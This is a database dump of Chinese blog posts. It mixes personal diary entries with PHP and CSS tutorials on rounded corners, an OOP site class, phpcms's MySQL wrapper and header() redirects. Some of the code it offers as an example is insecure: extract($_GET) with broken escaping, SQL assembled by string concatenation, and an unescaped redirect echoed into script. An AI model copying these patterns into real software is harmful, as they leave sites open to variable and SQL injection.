</p>\r\n<P>自己对生活的理解似乎越来越深刻，paperen我明白活着并不是去混日子，而是应该去追求什么，而生活好像真的不是一件很轻松的事情，而快乐也是要自己去追求的，而不是像小时候的那样能嬉皮笑脸。 </p><!--more-->\r\n<P>paperen我也忘记许多人了，今天群发了N条短信，将手机的通讯本中的所有人都发了一遍，对于某些人的印象都是在自己看到他们的名字时才能记起曾经的交往，某些人的手机号码则是没有回复报告，就是说此号码已经停用，但是我还是没从通讯录中删除他们，还是留着吧，因为他们曾经出现在自己的生活中，所以还是留着吧，而一瞬间，手机的通讯录貌似就成为了自己的回忆录，每标记一个人你就会想起曾经与他交往的事情。 </p>\r\n<P>还是谈回天气吧，谈天气总是比较轻松而且没有什么深度的事情。昨晚穿着两件衫出去坐着爸爸的摩托上，感觉确实比较冷，有时候想问一下有体会过北方冬天温度的南方人，到底是北方冬天冷还是南方冬天冷。 </p>\r\n<P>算啦，也想不出有什么好说的啦，啊，对了，家里那只猫咪这段时间老是在自己的床上睡觉……细佬放假天天就是在看TVS5……叔叔已经将吉他拿回来给我，但是发觉自己已经唱不出歌了……还有发觉自己的胡子不刮两天就很长了…… </p>\r\n<P>而最后最后还是给大家拜个早年吧，paperen自己不会说太多夸张的话，就几句罢了，新年快乐，身体健康，事事顺心吧，或者还加上一个，珍惜现在。</p></p>', 2, 1, 972, 1, 0, 0, 1266042506, 0),
(38, '在网页设计中使用圆角形', 'use-radius-in-webpage', 3, '<P>新年就这样过去了，其实paperen都觉得新年好像越来越没意思，都是与亲戚们到处吃饭，自己还是喜欢吃家里的饭，而且到外面吃paperen我一定吃不饱的……最近几天聚会也很多，加上前天服务器维护所以导致今天才能写写文章。 </p>\r\n<P>话说N久之前paperen我就想在网页中使用圆角形来做，看过一些css书中也有相关介绍，某些做法也是很麻烦的，对html结构很不好，而如果大家有对css3有了解的话也知道css3中已经有支持圆角形的css了，只不过不是每个浏览器都能解析，特别是ie，也就是说你还是得安安分分想其他办法去应付ie浏览器中的圆角形效果，而这里也稍微说说自己曾经与现在制造圆角形的方法。 </p>\r\n<P>因为对于css3的圆角形的css代码普遍不被支持，所以paperen一般还是使用图片来制造圆角形的效果。 </p><!--more-->\r\n<P>而曾经paperen是这样制造圆角形的。</p>\r\n<P><a href="http://localhost/paperenblog/file/56" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/56" alt="201002231266854768" title="上传于2010-02-23"></a> </p><P>(虚线是表示按照虚线来切图，或者如果需要标题的话头部应该留高一点)这样貌似也是一种方法，html结构可以写成这样</p><P><PRE>&lt;div class="container"&gt;<br />&lt;h5 class="t"&gt;&lt;/h5&gt;&lt;!--或者可以扩展一下头部标题的作用，需要统一定义padding与margin啦--&gt;<br />&lt;p class="b"&gt;&lt;/p&gt;&lt;!--用于放内容的--&gt;<br />&lt;span class="f"&gt;&lt;/span&gt;&lt;!--用于底部那张图片--&gt;<br />&lt;/div&gt;</PRE>或者你还可以这样\r\n<P><a href="http://localhost/paperenblog/file/57" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/57" alt="201002231266855579" title="上传于2010-02-23"></a> </p><P><PRE>&lt;div class="container"&gt;<br />  &lt;div class="l"&gt;<br />   &lt;h1 class="t"&gt;我是圆角形的啊&lt;a href="#" class="more"&gt;更多&lt;/a&gt;&lt;/h1&gt;<br />  &lt;/div&gt;<br />&lt;/div&gt;<br /></PRE><P>贴上这个的css，相比于第一种方法，这个html结构比较简单而且巧妙处在css中充分利用了padding这个内边框属性还有图片定位显示</p><PRE>.container{margin:5px;background:url(my.gif) no-repeat 0px 0px;width:250px;}<br />.l{background:url(my.gif) no-repeat 100% -70px;padding:0px 7px 0px 7px;}<br />.t{background:url(my.gif) repeat-x 0px -35px;font-size:12px;height:22px;padding:8px 8px 0px 8px;position:relative;}<br />.t .more{position:absolute;right:7px;}</PRE><P>其实都是使用相同的图片，只不过是显示的位置不一样。</p>\r\n<P><a href="http://localhost/paperenblog/file/58" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/58" alt="201002231266856100" title="上传于2010-02-23"></a></p>\r\n<P>它们之间的垂直距离是5px，彼此都是30px高。 </p>\r\n<P>其实还有一种最方便的方法实现圆角形，就是css3中的Border-radius属性，但是<a href="http://localhost/paperenblog/file/59" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/59" alt="201002231266856261" title="上传于2010-02-23"></a></p><P>不是每个浏览器都能对它很好的支持的啊……</p><PRE>.test{border-width:1px;border-style:solid;-moz-border-radius:5px;-khtml-border-radius:5px;-webkit-border-radius:5px;border-radius:5px;padding:5px;}\r\n</PRE><P>将一个容器加上class属性是test，然后在火狐中看看它的边框已经是圆角形了，但是ie中却不行，包括opera。这就是大名鼎鼎的，浏览器对css兼容的问题啦。 </p>\r\n<P>话说回来不知道大家看了上面的三种方法有什么体会，paperen就觉得一二种都不是很完美的方法，因为容器的高度是固定了，如果一改变高度则需要修改图片与css的数值，并不具有可适应的优点，记得以前在看css书的时候曾经看到有一种办法是可以制造有弹性的圆角形的，不过那时候paperen看到它的html有点复杂没有记下来。而至于第三种方法嘛，确实很废……如果你只考虑火狐中网页的效果的话是可以使用，但是如果还要保证ie中看的效果你还是老老实实用图片的方法来做吧，或者用其他比我这里说的更好的办法去弄吧。</p></p>', 2, 1, 987, 0, 0, 0, 1266856821, 0),
(39, 'oop思想去建造网站', 'use-oop', 2, '<P>话说paperen都N久没写东西了，这段时间都是在折腾，昨天才从广州折腾回来，感觉生活有时候真是很累很累……工作都是要求你会框架，会改造一些开源东东，确实自己这方面还是不行啊，oop这种思想也不经常使用，或许是自己懒吧，当习惯了以前那种编码风格后老是照着那种模式去编，而没有再去研究一些更好的方法，例如大家推荐的oop风格与框架开发。 </p>\r\n<P>昨晚看了一些书，也得到了一些启发。其实对于php中类的概念与c++中的类是差不多的，应该说几乎一样吧，不过php的class不支持多重继承，书中说你可以使用接口去弥补，不过这里多余的东西就不多说了。 </p>\r\n<P>记得paperen之前那篇解析自己是怎样写php网站的文章吧，思想是很简单的，统一入口index，在index页中判断传入的参数决定给予浏览者哪个页面与应该调用哪个相应的处理文件（一般都要写写.htaccess文件来完成网址重写的功能），例如首页是index.inc.php（这里就paperen我就叫处理文件吧）在这里面可以处理一些与数据库交互的操作与运算，然后再调用需要的文件（视图文件）index.tpl。</p><!--more-->\r\n<P><a href="http://localhost/paperenblog/file/60" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/60" alt="201003061267863979" title="上传于2010-03-06"></a></p>\r\n<P>一当我们将index.php页的代码写好后后面除非需要一些额外功能否则就不用动index.php的代码了，因为它只是作为统一的入口获得参数并转向相应的地方进行相应的处理，它只是一个入口，而使用这种方法来建设网站，很显然的重点在与index.inc.php这种处理文件，对于不同功能的页面差别也是在这里，比如对于网站首页你需要查取数据库中所有表的前五条数据，而对于关于板块中你需要查询某个表中的一些字段，那么其差异性就完全在index.inc.php与about.inc.php中体验出来了，而当然啦，你还需要扩展我们定义那个$m数组加入about键值的标题与mod值，而每个处理文件最后require的tpl文件也不一定相同，不过可以肯定的是都需要head.tpl与foot.tpl文件。 </p>\r\n<P>而对于使用oop的思想去做的话，我们又应该怎去设计呢？对于一个网站肯定是得要分块去设计的，头部，脚部，正如上面那样分了head.tpl与foot.tpl的文件，因为整个网站肯定会有部分是相同的，我们不可能在每个文件中将这些重复的代码重写一遍，之后再考虑怎样实现不同页面的不同布局，不同标题，不同的数据操作。引入不同JavaScript文件与css文件。而paperen自己也写了一个这样的class，放出来仅供参考，其实与《php与mysql web开发》一书上放出来的例子差不多。（class.inc.php）</p><PRE> class site<br /> {<br />  public $title,$jsarray,$cssarray,$body,$nav;<br />  public function set_title($title){<br />   $this-&gt;title=$title;<br />  }<br />  public function set_jsarray($jsarray){<br />   $this-&gt;jsarray=$jsarray;<br />  }<br />  public function set_cssarray($cssarray){<br />   $this-&gt;cssarray=$cssarray;<br />  }<br />  public function set_nav($nav){<br />   $this-&gt;nav=$nav;<br />  }<br />  public function set_body($body){<br />   $this-&gt;body=$body;<br />  }<br />  public function display(){<br />   global $p;<br />   $title=$this-&gt;title;<br />   $jsarray=$this-&gt;jsarray;<br />   $cssarray=$this-&gt;cssarray;<br />   $nav=$this-&gt;nav;<br />   require(TMP_PATH."head.tpl");<br />   if(!empty($this-&gt;body)){<br />    require(TMP_PATH.$this-&gt;body);<br />   }<br />   require(TMP_PATH."foot.tpl");<br />  }<br /> }<br />?&gt;</PRE><P>定义了一些set函数用来往这个类中放不同的参数。（index.php的代码）</p><PRE> require("include/common.inc.php");<br /> $s=new site;<br /> $s-&gt;set_title("test use oop");<br /> $s-&gt;set_jsarray(array(''1''=&gt;''js.js'',''2''=&gt;''base.js''));<br /> $s-&gt;set_cssarray(array(''1''=&gt;''style.css''));<br /> $s-&gt;set_nav($temp);<br /> $s-&gt;set_body($tmp);<br /> $s-&gt;display();<br /> unset($s);<br />?&gt;</PRE><P>common.inc.php代码</p><PRE> define(''SITE_URL'',''http://192.168.1.16/test/oop/'');<br /> define(''INC_PATH'',dirname(__FILE__)."/");<br /> define(''SITE_ROOT'',INC_PATH."../");<br /> define(''TMP_PATH'',SITE_ROOT."templates/");<br /> define(''JS'',SITE_URL."js/");<br /> define(''CSS'',SITE_URL."css/");<br /> require(INC_PATH."class.inc.php");<br /> require(INC_PATH."fun.inc.php");<br /> $temp=array(''index''=&gt;''index.tpl.php'',''about''=&gt;''about.tpl.php'');<br /> new_addslashes(extract($_GET));<br /> $tmp=read_tmp();<br />?&gt;</PRE><P>fun.inc.php代码</p><PRE> function new_addslashes($string){<br />  if(!is_array($string)) return addslashes($string);<br />  foreach($string as $key =&gt; $val) $string[$key]=new_addslashes($val);<br />  return $string;<br /> }<br /> function read_tmp(){<br />  global $p,$temp;<br />  return isset($temp[$p]) ? $temp[$p] : $temp[''index''];<br /> }<br />?&gt;</PRE><P><a href="http://localhost/paperenblog/file/61" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/61" alt="201003061267865794" title="上传于2010-03-06"></a></p>\r\n<P>怎么paperen我觉得这样好像与不使用类去做的时候的思路差不多呢，区别或者出在第二步，如果使用oop将会产生一个对象去处理，我们需要往里面放入一些参数然后display它。 </p>\r\n<P>或许是自己刚刚接触使用oop的思想去建设网站吧，其实许多地方都得完善一下（至少要检查一下参数的正确是否存在某个文件吧），对于以前的手法自己已经很熟了，所以突然转到使用面向对象的方法去做的话可能会真的需要一段时间去适应，而paperen我也承认自己是一个一旦适应了就很难改变的人=。=</p></p>', 2, 1, 869, 0, 0, 0, 1267866159, 0),
(40, 'phpcms中那个操作mysql的类', 'mysql-class-in-phpcms', 2, '<P>今天早上才发表了一篇，下午paperen我趁着有空又回头去看了下个phpcms的代码，一直看到晚上，当然啦，这次再看又有了不少收获，有些地方理解更加深刻了，或许paperen说的学习php的好办法就是在动手与读代码中循环进行的。 </p>\r\n<P>不说太多废话了吧，这次挖了它操作mysql的那个类过来解剖，这个类用起来还真是相当的方便啊。让我们来see see到底是怎样使用吧。不过在你看下面的东西时先声明一下单这个类的代码就有240多行。paperen我会在下面慢慢说的。 </p>\r\n<P>一开始肯定要定义一系列数据库相关的常量与require这个文件过来。</p><!--more-->\r\n<P><a href="http://localhost/paperenblog/file/62" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/62" alt="201003061267886225" title="上传于2010-03-06"></a></p>\r\n<P>之后就创建一个对象，然后调用connect方法去连接我们的mysql数据库。</p>\r\n<P><a href="http://localhost/paperenblog/file/63" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/63" alt="201003061267886342" title="上传于2010-03-06"></a></p>\r\n<P> 到这里先让大家看看这个类中的connect方法是怎样的吧。（代码不少）</p><PRE>function connect($dbhost, $dbuser, $dbpw, $dbname = '''', $pconnect = 0, $charset = '''')<br /> {<br />  $func = $pconnect == 1 ? ''mysql_pconnect'' : ''mysql_connect'';//选择连接mysql是否持久连接（而两者的区别我也是不太明白）<br />  if(!$this-&gt;connid = @$func($dbhost, $dbuser, $dbpw))<br />  {<br />   if(DB_NAME == '''' &amp;&amp; file_exists(PHPCMS_ROOT.''install.php''))<br />   {<br />    header(''location:./install.php'');//对于数据库名字为空的话会跳转到安装那，如果自己挖过来用的话，需要改改这里啦<br />    exit;<br />   }<br />   $this-&gt;halt(''Can not connect to MySQL server'');//用自身的halt方法报错<br />   return false;<br />  }<br />  if($this-&gt;version() &gt; ''4.1'')<br />  {<br />   $serverset = $charset ? "character_set_connection=''$charset'',character_set_results=''$charset'',character_set_client=binary" : '''';<br />   $serverset .= $this-&gt;version() &gt; ''5.0.1'' ? ((empty($serverset) ? '''' : '','')." sql_mode='''' ") : '''';<br />   $serverset &amp;&amp; mysql_query("SET $serverset", $this-&gt;connid);//这里大概是设置送入数据库的字符编码吧<br />  }<br />  if($dbname &amp;&amp; !@mysql_select_db($dbname , $this-&gt;connid))<br />  {<br />   $this-&gt;halt(''Cannot use database ''.$dbname);//选择数据库，选不上也报错<br />   return false;<br />  }<br />  $this-&gt;dbname = $dbname;//将能选择上的数据库名字赋予类中的dbname变量<br />  return $this-&gt;connid;//返回连接标识号<br /> }</PRE><P>都已经写上注释了，希望大家能看明白吧，不过这个connect方法其实也不需要大家看懂吧，会用上就行啦。主要是要设置对我们的常量DB_HOST，DB_USER等等。不然会出现一些错误。 </p>\r\n<P>再来看看query方法，其实就是与mysql_query差不多不错多了可以选择两种输入sql语句的方法并且还有自定义报错功能的支持。</p><PRE>function query($sql , $type = '''')<br /> {<br />  $func = $type == ''UNBUFFERED'' ? ''mysql_unbuffered_query'' : ''mysql_query'';//选择不同的送入sql语句的方式，后者我都没用过……<br />  if(!($query = @$func($sql , $this-&gt;connid)) &amp;&amp; $type != ''SILENT'')//送入sql语句加判断<br />  {<br />   $this-&gt;halt(''MySQL Query Error'', $sql);//如果失败则报错<br />   return false;<br />  }<br />  $this-&gt;querynum++;//没送入一条自身的querynum变量加1<br />  return $query;//返回mysql返回的数据标识集（是这样叫吧，这个东西不是数据）<br /> }</PRE><P>对于用法很简单啦，echo $db-&gt;query("select * from member");//会得到类似Resource id #4的结果，这就是paperen我说的这个并不是数据的自身，而是mysql给的一个标识吧（这样的结果也确实会令人不解）。 </p>\r\n<P>之后是select方法。</p><PRE>function select($sql, $keyfield = '''')//注意参数都有些什么，别传错值了<br /> {<br />  $array = array();<br />  $result = $this-&gt;query($sql);//调用query方法得到那个数据标识集<br />  while($r = $this-&gt;fetch_array($result))//fetch_array其实就是mysql_fetch_array<br />  {<br />   if($keyfield)//可以针对某个字段进行查数据<br />   {<br />    $key = $r[$keyfield];<br />    $array[$key] = $r;<br />   }<br />   else//否则将所有的数据都放到这个数组中<br />   {<br />    $array[] = $r;<br />   }<br />  }<br />  $this-&gt;free_result($result);//释放掉这个结果,这个方法其实就是mysql_free_result<br />  return $array;//返回这个数组<br /> }</PRE><P>使用起来真的很方便，例如没有加限定字段的查询 print_r($db-&gt;select("select name from member"));得到的结果数据的组织形式是类似这样的</p>\r\n<P>Array ( [0] =&gt; Array ( [name] =&gt; paper ) [1] =&gt; Array ( [name] =&gt; liang ) [2] =&gt; Array ( [name] =&gt; tom ) [3] =&gt; Array ( [name] =&gt; peter ) ) </p>\r\n<P>可能你还需要使用foreach对其进行分离。而对加上字端限制的，例如</p>\r\n<P>foreach($db-&gt;select("select name from member where id=1","name") as $name=&gt;$data){<br />  echo $name;<br /> }</p>\r\n<P>应该就能符合你的要求，看你需要怎样处理数据吧，返回的反正是个数组，你根据自己需要进行一系列的分割就可以了。 </p>\r\n<P>insert方法</p><PRE>function insert($tablename, $array)<br /> {<br />  $this-&gt;check_fields($tablename, $array);<br />  return $this-&gt;query("INSERT INTO `$tablename`(`".implode(''`,`'', array_keys($array))."`) VALUES(''".implode("'',''", $array)."'')");<br /> }</PRE><P>这个代码少而且很妙，参数的形式显而易见，对于插入的数据只要组织成一个数组形式然后放入来就可以了使用implode对数据进行分割还有array_keys，使各个数据都切到好处地形成一句标准的insert语句。（但是遗憾的是不支持多条数据的插入） </p>\r\n<P>使用方法是：</p>\r\n<P>$array=array(''name''=&gt;''test'',''phone''=&gt;''2232323223'',''email''=&gt;''test@163.com'');<br /> echo $db-&gt;insert("member",$array); </p>\r\n<P>get_fields方法（为了后面的方法的解析作个铺垫）</p><PRE>function get_fields($table)<br /> {<br />  $fields = array();<br />  $result = $this-&gt;query("SHOW COLUMNS FROM $table");<br />  while($r = $this-&gt;fetch_array($result))<br />  {<br />   $fields[] = $r[''Field''];<br />  }<br />  $this-&gt;free_result($result);<br />  return $fields;<br /> }</PRE><P>参数是表的名字就ok了，会返回该表的所有字段的名字以（数组的形式返回）。 </p>\r\n<P>check_fields方法</p><PRE>function check_fields($tablename, $array)<br /> {<br />  $fields = $this-&gt;get_fields($tablename);<br />  foreach($array AS $k=&gt;$v)<br />  {<br />   if(!in_array($k,$fields))<br />   {<br />    $this-&gt;halt(''MySQL Query Error'', "Unknown column ''$k'' in field list");<br />    return false;<br />   }<br />  }<br /> }</PRE><P>参数第一个值就是表的名称，而第二个是字段的名称并以数组的形式传入，使用foreach拆分数据并使用in_array判断该表是否存在该字段。 </p>\r\n<P>update的方法</p><PRE>function update($tablename, $array, $where = '''')//前面对这个两个检查字段的方法介绍都是为了这个方法而准备的<br /> {<br />  $this-&gt;check_fields($tablename, $array);//check_fields<br />  if($where)//如果存在where的话产生不同的sql语句<br />  {<br />   $sql = '''';<br />   foreach($array as $k=&gt;$v)<br />   {<br />    $sql .= ", `$k`=''$v''";//拆分update的数据<br />   }<br />   $sql = substr($sql, 1);//组织成一条完整而正确的sql语句(去掉前面的逗号)<br />   $sql = "UPDATE `$tablename` SET $sql WHERE $where";<br />  }<br />  else<br />  {<br />   $sql = "REPLACE INTO `$tablename`(`".implode(''`,`'', array_keys($array))."`) VALUES(''".implode("'',''", $array)."'')";<br />  }<br />  return $this-&gt;query($sql);<br /> }</PRE><P>使用方法：</p>\r\n<P>$array=array(''name''=&gt;''peter'',''phone''=&gt;''11234'');<br />echo $db-&gt;update("member",$array,"`name`=''test''"); </p>\r\n<P>还说说这个吧escape方法</p><PRE>function escape($string)<br /> {<br />  if(!is_array($string)) return str_replace(array(''n'', ''r''), array(chr(10), chr(13)), mysql_real_escape_string(preg_replace($this-&gt;search, $this-&gt;replace, $string), $this-&gt;connid));//保证送入mysql的语句是安全的并且是能执行的（有时候你会需要它的，相信我）<br />  foreach($string as $key=&gt;$val) $string[$key] = $this-&gt;escape($val);//递归使用<br />  return $string;<br /> }<br /></PRE><P>正如注释说的，有时候你会需要这个方法的。 </p>\r\n<P>最后说说这个halt方法吧，自身的报错方法。</p><PRE>function halt($message = '''', $sql = '''')<br /> {<br />  $this-&gt;errormsg = "MySQL Query : $sql <br /> MySQL Error : ".$this-&gt;error()." <br /> MySQL Errno : ".$this-&gt;errno()." <br /> Message :  $message";<br />  if($this-&gt;debug)//你当然可以设置关掉这个显示更详细信息的功能<br />  {<br />   $msg = (defined(''IN_ADMIN'') || DEBUG) ? $this-&gt;errormsg : "Bad Request. $LANG[illegal_request_return]";//额..这句代码可以kill吧，因为如果我们自己用的话就不是这样的了<br />   echo ''&lt;DIV style="font-size:12px;text-align:left; border:1px solid #9cc9e0; padding:1px 4px;color:#000000;font-family:Arial, Helvetica,sans-serif;"&gt;''.$msg.''&lt;/DIV&gt;'';//为了显示美观点所以加上了一大段style<br />   exit;<br />  }<br /> }</PRE><P>你可以设置是否显示更详细的错误信息的，就是这个类中的debug变量设为0就ok了。（默认是1） </p>\r\n<P>其实还有很多方法，不过paperen我觉得其他那些就没必要都放出来说说吧，相信大家都能看明白那个。</p><P>最后附上完整代码的地址<A href="http://iamlze.cn/demo/mysqlclass/">http://iamlze.cn/demo/mysqlclass/</A></p></p>', 2, 1, 1045, 1, 2, 0, 1267889781, 0),
(52, '换行符与header', 'br-and-header', 2, '<p>顶~~N久没发表东西了，近来paperen除了工作还是工作，paperen对于公司目前的项目管理有一大堆意见~~不过新来就不要太激进了，前段时间已经因为自己对于目前开发的那个项目首页的性能而弄了一个小会，我提的意见主管老是说好，但是结果还是没有落实，唉，算啦~~竟然他们都不理会，paperen会用代码与实例来证明给他们听的啦。</p><p>今天自己将本机中的后台代码传上本地网络的一台测试服务器上（因为他们要在局域网中测试项目），但是遇到了一个header的问题，让paperen郁闷了一会。自己用下面这个函数来重定向（有js模式的重定向与直接使用header），比如后台某些操作成功后会自动跳转之类的功能，当然也会直接跳转。</p><pre>function dheader($location, $isjs = false, $timer = 1){<br />    if(empty($location)) return '''';<br />    if($isjs){<br />        $timer = $timer*1000;<br />        echo "&lt;script type=''"text/javascript"''&gt;setTimeout("window.location.href=''$location''", $timer);&lt;/script&gt;";<br />    }else{<br />        header("location:$location");<br />        exit();<br />    }<br />}<br /></pre><p>而结果在直接header时总出现警告。</p><!--more--><p><a href="http://localhost/paperenblog/file/64" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/64" alt="20100812205949" title="上传于2010-08-12"></a></p><p>在header之前已经有输出，没错就是这个原因。</p><p>网上资料很多而且说得已经很明白。不能在header前有任何输出。</p><p><a href="http://www.itlearner.com/article/4467" target="_blank">http://www.itlearner.com/article/4467</a></p><p>但是感觉不可能吧，我之前貌似没输出吧，而错误提示提示我出现在引入语言包之前，嗯，没错那个语言包是有字符，不过是放在一个数组，难道这也会有影响？将语言包的那个变量注释掉~~结果还是提示已经在这个语言包文件中有输出……</p><p>paperen开始怀疑是不是不能引入这个语言包是中文的问题……但是注释调还是提示，这次我干脆删掉整个变量再试，结果还是不行，但是当我删掉整个语言包变量后发现了问题所在……就是换行符的问题！！</p><p><a href="http://localhost/paperenblog/file/65" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/65" alt="20100813084019" title="上传于2010-08-13"></a></p><p>f**k，paperen真是太大意了，of course这个换行符也是输出，竟然被自己忽略了。</p><p>个人觉得在header前不能有任何输出的意思是在调用header之前不能有任何非php代码的插入（不在<?php ?>标记包含之中的都属于非php代码），还有个人认为不要使用记事本编辑utf8格式的php文件，貌似记事本会为utf8文件加上一个文件头BOM（Unicode Signature），而这个头标志可能也会属于一个输出~~</p><p>当然，即使确实不能避免在header前有输出，那么可以使用ob来解决这个问题滴~~正如上面的那个链接中说关于header的注意技巧。在输出前使用ob_start();在header前ob_end_clean，或许您不明白到底这个ob是干嘛滴，查查php手册就可以有关于这个老兄的说明。</p><p class="para rdfs-comment">ob_start--This function will turn output buffering on. While \r\noutput buffering is active no output is sent from the script (other than \r\nheaders), instead the output is stored in an internal buffer. </p><p class="para rdfs-comment">就是说使用ob_start使用后服务端会将之前编译的代码放在临时的缓存中而不对其进行输出。当然要理解怎用还是要自己动手试试。</p><p>1.出现警告</p><pre>&lt;?php <br ?="">	echo "顶你个肺~~";<br />	header("location:header.html");<br />?&gt;<br /></pre><p>2.header成功</p><pre>&lt;?php <br ?="">	ob_start();<br />	echo "顶你个肺~~";<br />	ob_end_clean();<br />	header("location:header.html");<br />?&gt;<br /></pre><p>3.关于ob_start(),ob_end_clean()与ob_flush()的测试</p><pre>&lt;?php <br ?="">	ob_start();<br />	echo "顶你个肺~~";<br />	ob_end_clean();<br />	echo "再顶~~";<br />?&gt;</pre><p>相信您试完这些代码后就会明白的了~~</p></p>', 2, 1, 966, 0, 0, 0, 1281661731, 0),
(41, '突然', 'suddenly', 1, '<P>话说paperen真的好久没更新博客了……这段时间好像都不想写东西了，特别是等待通知的时候心烦得很，根本就不想写东西，而今天也终于写一下吧，因为突然间就上班了，在江门一家公司做，现在还刚开始，他们用的框架是QeePHP，自己啥都不会还得从头开始上手，今天第一天上班，感觉还行吧，不是特别累，但是也是挺累……因为paperen我要看框架文档，要知道怎样用这个框架开发，还有他们也给我一个时间去完成任务，感觉这个公司的内部管理制度还是不错的。而同事们都挺好的，搞技术的都是高手，搞市场的也是高手，而且都很年轻。 </p>\r\n<P>今天下午广州那家诺网公司打电话叫我明天去复试，paperen我那时确实挺矛盾的，但是当时就狠心推掉了，因为感觉现在这份工作挺不错的，虽然现在是实习时期工资也不高，但公司还是不错的，先做着看看吧。明早还是要6点起床，工作啊工作啊…… </p>\r\n<P>以上内容是写在3月25日的。 </p><!--more-->\r\n<P>而突然现在我就将江门那份退掉了，而昨天我请了假（理由还是说回乡，其实是打算去广州），手机其实已调了闹钟，7点多就响了，但是我还是继续睡下去，一直拖到9点多，然后起床刷牙，对着镜子想了许久，好像镜子里面的那个自己老是在问“你不是要去广州吗？还去不去啊？”，其实26日那天广州那间公司又给我打了一个电话，要我过来复试再谈待遇，说待遇会比我现在的好，当然paperen我也是得考虑待遇的，如果你到了广州还是与这里一样的工资肯定不行，因为在广州还得租房住嘛，还要自己的生活费用，不像在家里这样。但是paperen决定要去试试的原因主要是这份工作是我自己争取回来的，感觉与现在这份工作有点不同的味道，既然第一轮笔试通过了（或许是通过了吧，因为自己感觉做得不怎么好……）为什么不再去试试，我怕自己以后会后悔，所以就决定请一天假再去一趟。但是昨天从7点多一直到11点多，应该是说从离开家门口一直到新会汽车站，自己都没有坚决的心情……中途还想放弃，但是最后还是买上去广州的车票，自己连中午饭都没吃就吃了个早餐，一路赶过去地铁然后公交，终于两点四十多到了，填一份资料然后机试，自己大约用了不到一个小时就算完成了，然后谈了一些工资与公司的情况，说给我两天时间准备，然后如果来的话星期一就上班，而且直接有任务做。当时自己真的没太开心……因为时间很紧。而当我晚上10点多回到新会时，爸爸告诉我，叔叔让我给他打电话，跟他通了电话后才知道他这个周末从深圳回来了，告诉我他深圳间公司也需要人开发网站，也要我考虑一下，有时候真的很难抉择……有人说考虑待遇，有人说考虑自己的想法……那你觉得呢？我现在都不知道如果选择好了，感觉自己现在没了一些东西，以前弄懒吧那时的某种心情。此时此刻的我还是未果……</p></p>', 2, 1, 997, 1, 0, 0, 1269275908, 0);
INSERT INTO `post` (`id`, `title`, `urltitle`, `categoryid`, `content`, `authorid`, `ispublic`, `click`, `good`, `bad`, `savetime`, `posttime`, `isdraft`) VALUES
(42, '关于MVC模式', 'about-mvc', 2, '<P>对于这个三个字母组成的这个专业名词，paperen我就不具体解析太多了，因为自己也不是十分十分的掌握。对于初学者而言或许你不用过分地从这个名词开始你的php之路，但是如果你走在php的道路上时就不可不知道这个名词了，因为这种思想对于开发网站而言是十分有利的，充分体验就是它将一个站点的分离成三个大体部分，M（模型），V（视图）和C（控制器），而正是这样使之可以使用具有不同专长的人员进行整个站点的开发，比如你是一个优秀的网页设计师，那么好简单你的工作就是去写好你的css，js还有html结构，当然他还要学一种模板语言，或者是开发小组自定义的一种模板语言，他不用理会过多关于php的东西甚至数据的组织问题。至于模型应该是算法最为之集中的地方，与数据库交互并处理数据，而这个部分就交由程序工程人员吧，而他们也不用处理任何页面表现的东西。而（C）控制器就是衔接V与M的一个桥梁吧，通过浏览者的动作去触发相应的响应进而通知相应模型获得数据之后再放入视图进行显示，那么一个页面就是如此完成了。 </p>\r\n<P>当然啦，开头说了这些都只是一个很模糊的描述，paperen我也不是理解得很深刻，但是看了一下《php高级程序设计》一书还有看了一些开源的代码，也使用过qeephp这个框架就不多不少有了点了解。有这个思想是很重要的，所以在开发中就要向这方面去靠。 </p>\r\n<P>对于模板语言，当然你可以使用smarty，还可以自己定义自己的一套，在paperen看的一些开源程序中就经常使用一些正则去将这些模板语言翻译成能被php解析的语言。而显然这一部分是很好理解的，如果真的还是不那么了解你可以去看看phpcms的那些视图文件。 </p><!--more-->\r\n<P>类似这样 $str = preg_replace("/{([A-Z_x7f-xff][A-Z0-9_x7f-xff]*)}/s", "",$str''&gt;\\1;?&gt;",$str); 然后视图文件中 \r\n<P>真正纠结的是对于M与C这两个部分，因为我们经常是将处理数据与响应浏览者动作放在一起的。 </p>\r\n<P>举个例子吧，比如我们要做一个文章发表的功能，这个文件时post.php，这个页面有一个表单的html结构，它的视图确实很简单的了，第一次加载或者是说填写信息的时候也是不需要与数据库交互的，但是当数据提交时你得将表单的数据插入到数据库，并且必要时需要进行判断数据的正确性或者对数据进行一定处理，那么你可能会想到在建一个叫save的页面由它来接受来自post页面的数据，但是之后你可能会把save的功能全部放在post页中来，因为你发觉你可以使用一些$_POST变量是否存在来判断本次交互是否提交数据，所以你会在post.php前面加入一段用来处理提交数据与插入数据库的代码，它其实与填写数据无关也与视图无关，但是它与我们点击“发表”这个按钮后有关，好了，现在我们这个post页的代码确实是够强大了，强大得可以成为一个独立的文件存在，因为考虑到它的独立性，我们不可能将其放置在一些目录下，一般我们会把放在根目录下，随着功能的强大，这种单独文件的代码也会因此增加，数量也会增加，而典型的会出现“大头”的现象就是你会发觉这个文件中头部的代码是十分复杂的，而这种开发根本就是没有控制器而言，因为每个文件就是一个控制器，访问每个文件就等于触发了不同的动作，而模型的概念就是每个单独文件的大头部分。 </p>\r\n<P>这样的开发对于大型站点是相当不利的，即使你使用了引用外部库文件的思想来进行开发但是最后的维护也是变得异常的烦躁，对于修改一个视图元素你可能会需要更改其“大头”部分中的一些代码。 </p>\r\n<P>固然引用专业用语对MVC的优点的描述是--“模型―视图―控制器模式的目的是实现一种动态的程序设计，使后续对程序的修改和扩展简化，并且使程序某一部分的重复利用成为可能。除此之外此模式通过对复杂度的简化使程序结构更加直观。” </p>\r\n<P>你可能会问“哦~~这样啊，那我怎样使用MVC呢？”答案是使用框架开发吧……那等于你需要去学习框架，而那又是一个新的开始，确实，对于初学者来说学习框架好像就是与底层php脱离了关系了，或者这样说，一个好的框架就是让我们对底层的php越来越疏远，因为框架已经将所用功能封装得滴水不漏，而我们只需要看完其文档然后根据它的规则进行开发，开发会变得很高效，很方便。 